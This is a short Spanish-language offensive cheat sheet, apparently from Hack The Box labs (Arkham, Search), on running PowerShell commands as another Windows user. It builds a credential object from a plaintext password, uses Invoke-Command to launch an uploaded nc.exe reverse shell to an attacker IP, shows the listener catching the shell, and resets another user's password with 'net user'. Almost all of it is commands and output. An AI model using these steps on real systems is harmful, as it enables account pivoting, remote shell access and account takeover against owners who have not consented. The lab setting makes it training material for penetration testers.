# Windows Script Block for exec Commands like other User with his password

Paso 1
```
$secPass = ConvertTo-SecureString 'Zx^#!QZX+T!123' -AsPlainText -Force
```
Paso 2
```
$cred = New-Object System.Management.Automation.PSCredential('ARKHAM\batman', $secPass)
```

Paso 3 ejecutando comandos como el usuario Batman desde el user alfred
```
whoami
arkham\alfred

Invoke-Command -ComputerName ARKHAM -Credential $cred -ScriptBlock { whoami }
arkham\batman
PS C:\> 
```
Si tenemos un nc.exe subido a la maquina podemos enviarnos una rev shell para hacer user pivoting usando ScriptBlock para ejecutar
comandos como el usuario batman
```
Invoke-Command -ComputerName ARKHAM -Credential $cred -ScriptBlock { C:\Windows\System32\spool\drivers\color\nc.exe -e cmd 10.10.16.7 443 }
```
Ganando acceso
```
# rlwrap nc -vlnp 443
listening on [any] 443 ...
connect to [10.10.16.7] from (UNKNOWN) [10.10.10.130] 49698
Microsoft Windows [Version 10.0.17763.107]
(c) 2018 Microsoft Corporation. All rights reserved.

whoami
whoami
arkham\batman
```

Cambiando la password a otro usuario mediante el uso de ScriptBlock - Search.htb Box
```
Invoke-Command -ComputerName localhost -Credential $cred -ScriptBlock { net user tristan.davies Password123$ }
```
